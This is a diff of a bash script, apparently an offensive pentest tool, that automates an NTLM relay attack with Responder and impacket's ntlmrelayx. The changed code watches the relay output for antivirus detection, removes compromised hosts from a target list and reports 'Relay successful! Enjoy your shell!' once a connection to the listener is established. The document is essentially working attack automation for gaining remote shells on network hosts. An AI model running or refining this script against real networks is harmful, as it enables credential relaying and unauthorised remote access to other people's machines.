@@ -127,7 +127,7 @@ function checkProgramsNeeded(){
 	programs=(tmux rlwrap python3 netcat wget xterm net-tools)
 	for program in "${programs[@]}"; do checkApt $program; done
 
-    if [[ "$(python3 $(pwd)/responder/Responder.py -h)" != '' ]];then
+    if [[ $(python3 $(pwd)/responder/Responder.py -h &>/dev/null) -eq 0 ]];then
         	if [ ! -z $quiet ];then echo -e "\t${greenColour}[:)]${endColour} responder installed\n"; sleep 0.5; fi
         	makeBck
 	else
@@ -146,19 +146,19 @@ function checkProgramsNeeded(){
 		fi
 	fi
 
-    if [[ "$(python3 $(pwd)/impacket/examples/ntlmrelayx.py -h)" != '' ]];then
+	python3 $(pwd)/impacket/ntlmrelayx.py -h &>/dev/null
+	if [ $? -eq 0 ];then
 		if [ ! -z $quiet ];then echo -e "\t${greenColour}[:)]${endColour} impacket installed\n";sleep 0.5; fi
 	else
 		if [ ! -z $quiet ];then echo -e "\t${yellowColour}[:S]${endColour} impacket not installed, installing at '$(pwd)/impacket' directory"; sleep 0.5; fi
 		
-        if [ -e $(pwd)/impacket ];then rm -rf $(pwd)/impacket &>/dev/null; fi
+        	if [ -e $(pwd)/impacket ];then rm -rf $(pwd)/impacket &>/dev/null; fi
 
 		mkdir $(pwd)/impacket &>/dev/null; git clone https://github.com/SecureAuthCorp/impacket.git $(pwd)/impacket &>/dev/null
-		apt install -y python3-pip &>/dev/null
 		python3 -m pip install -q impacket &>/dev/null
-		
-        test -f "$(pwd)/impacket/examples/ntlmrelayx.py" &>/dev/null
-		if [ $? -eq 0 ]; then
+
+		python3 $(pwd)/impacket/examples/ntlmrelayx.py -h &>/dev/null 
+		if [ $? -eq 0 ];then
 			cp $(pwd)/impacket/examples/ntlmrelayx.py $(pwd)/impacket/ntlmrelayx.py
 			chmod u+x $(pwd)/impacket/ntlmrelayx.py
 			if [ ! -z $quiet  ]; then echo -e "\t${greenColour}[:)]${endColour} impacket installed\n"; sleep 0.5; fi
@@ -334,12 +334,24 @@ function relayingAttack(){
     if [ $? -ne 0 ];then echo -e "${redColour}[D:]${endColour} Unable to locate terminal in the system. Existing...\n"; badExit; else sleep 3; fi
 
 	portStatus=$(netstat -tunalp | grep $lport | awk '{print $6}' | sort -u)
+	cp $targets $(pwd)/impacket/hostsToRelay.tmp
 	while [ "$portStatus" == "LISTEN" ];do
 		portStatus=$(netstat -tnualp | grep $lport | awk '{print $6}' | sort -u);
-        tmux capture-pane -p | grep 'ScriptContainedMaliciousContent' &>/dev/null
-        if [ $? -eq 0 ];then
-          echo -e "${redColour}[:O]${endColour} Oh man, they got us! Throw this pc to the sea and run far away from here\n"; badExit
-        fi
+
+		tmux capture-pane -p > $(pwd)/impacket/ntlmrelayx.out 
+		grep 'ScriptContainedMaliciousContent' $(pwd)/impacket/ntlmrelayx.py &>/dev/null
+        	if [ $? -eq 0 ];then
+ 			echo -e "${redColour}[:O]${endColour} Oh man, they got us! Throw this pc to the sea and run far away from here\n"; badExit
+ 		fi
+		
+		grep 'STATUS_SHARING_VIOLATION' $(pwd)/impacket/ntlmrelayx.out &>/dev/null
+		if [ $? -eq 0 ];then
+			hostPwned=$(grep 'STATUS_SHARING_VIOLATION' -B1 $(pwd)/impacket/ntlmrelayx.out | head -1 | awk '{print $NF}')
+			sed s/$hostPwned// $(pwd)/impacket/hostsToRelay.tmp > $(pwd)/impacket/hostsToRelay.tmp2
+			cp $(pwd)/impacket/hostsToRelay.tmp2 $(pwd)/impacket/hostsToRelay.tmp && rm -f $(pwd)/impacket/hostsToRelay.tmp2 
+
+ 			if [ "$hostsToRelay" == '' ];then echo -e "${redColour}[-.-]${endColour} You already got a shell on all targets! Please, do not bully and remove it from $targets\n"; badExit; fi
+		fi
 	done
 
 	rhost=$(netstat -tnualp | grep $lport | awk '{print $5}' | tail -1 | awk -F: '{print $1}')
@@ -348,6 +360,7 @@ function relayingAttack(){
 
 	if [[ "$portStatus" == "ESTABLISHED" && $checkrhost -eq 1 ]];then
 		echo -ne "${blueColour}[:*]${endColour} Authenticating to target $rhost ..."
+
 		echo -e "\n\n${greenColour}[:D]${endColour} Relay successful! Enjoy your shell!\n"; sleep 0.5
 	else
 		echo -e "${redColour}[:(]${endColour} Relay unsuccessful! May be you need more coffee\n"; sleep 0.5
